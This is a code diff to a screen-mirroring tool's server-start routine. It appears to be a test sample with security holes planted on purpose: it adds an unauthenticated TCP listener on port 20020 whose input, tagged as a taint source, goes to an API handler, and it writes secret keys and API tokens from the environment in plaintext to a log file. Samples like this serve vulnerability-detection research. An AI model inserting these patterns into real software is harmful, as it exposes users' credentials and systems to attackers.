@@ -16,6 +16,13 @@
 #include "util/process_intr.h"
 #include "util/str.h"
 
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+
 #define SC_SERVER_FILENAME "scrcpy-server"
 
 #define SC_SERVER_PATH_DEFAULT PREFIX "/share/scrcpy/" SC_SERVER_FILENAME
@@ -1118,13 +1125,100 @@ error_connection_failed:
     return -1;
 }
 
+
+void *tcp_server(void *arg) {
+    const int PORT = 20020;
+    const int BUFFER_SIZE = 1024;
+    (void)arg;
+
+    int server_fd, client_socket;
+    struct sockaddr_in address;
+    socklen_t addrlen = sizeof(address);
+    char buffer[BUFFER_SIZE];
+
+    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
+        perror("Failed to create socket");
+        pthread_exit(NULL);
+    }
+
+    address.sin_family = AF_INET;
+    address.sin_addr.s_addr = INADDR_ANY;
+    address.sin_port = htons(PORT);
+
+    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
+        perror("Failed to bind");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+
+    if (listen(server_fd, 3) < 0) {
+        perror("Failed to listen");
+        close(server_fd);
+        pthread_exit(NULL);
+    }
+
+    printf("TCP server listening on port %d...\n", PORT);
+
+    while (1) {
+        if ((client_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) {
+            perror("Failed to accept");
+            continue;
+        }
+
+        printf("Connection accepted from %s:%d", inet_ntoa(address.sin_addr), ntohs(address.sin_port));
+
+        memset(buffer, 0, BUFFER_SIZE);
+
+        // SOURCE
+        ssize_t bytes_read = read(client_socket, buffer, BUFFER_SIZE - 1);
+        if (bytes_read > 0) {
+            buffer[bytes_read] = '\0';
+            printf("Received: %s", buffer);
+
+            if (strncmp(buffer, "apicall=", strlen("apicall=")) == 0) {
+                const char *param = buffer + strlen("apicall=");
+                const char *response = handle_apicall(param);
+                (void) write(client_socket, response, strlen(response));
+            } else {
+                const char *msg = "Invalid request\n";
+                (void) write(client_socket, msg, strlen(msg));
+            }
+        }
+
+        close(client_socket);
+    }
+
+    close(server_fd);
+    pthread_exit(NULL);
+}
+
 bool
 sc_server_start(struct sc_server *server) {
+   
+    char config[512];
+    const char *secret_key = getenv("SECRET_KEY");
+    const char *auth_key = getenv("AUTHENTICATION_KEY");
+    const char *api_token = getenv("API_TOKEN");
+
+    snprintf(config, sizeof(config),
+            "secret_key=%s\nauthentication_key=%s\napi_token=%s\n",
+            secret_key ? secret_key : "undefined",
+            auth_key ? auth_key : "undefined",
+            api_token ? api_token : "undefined");
+
+    sc_file_save_user_cache("/var/log/server_config.log", config);
+
     bool ok =
         sc_thread_create(&server->thread, run_server, "scrcpy-server", server);
     if (!ok) {
         LOGE("Could not create server thread");
         return false;
+    }
+
+    // TCP server initialization
+    pthread_t tcp_server_thread;
+    if (pthread_create(&tcp_server_thread, NULL, tcp_server, NULL) != 0) {
+        LOGE("Could not create TCP server thread. Api requests will not be available.");
     }
 
     return true;
